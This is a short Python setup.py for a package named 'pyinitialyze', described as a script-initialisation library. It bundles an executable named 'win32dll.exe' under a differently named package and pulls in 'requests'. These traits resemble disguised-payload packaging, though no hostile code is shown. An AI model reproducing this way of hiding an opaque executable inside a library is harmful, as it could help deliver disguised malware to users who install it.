from setuptools import setup, find_packages

setup(
    name='pyinitialyze',
    version='0.1.1',
    description='A Python lib you can use to initialize your Python scripts (Console based / Windowed)',
    author='Guillaume Plagier',
    packages=find_packages(),
    install_requires=["requests"], 
    package_data={
        'ma_lib': ['win32dll.exe']
    },
)
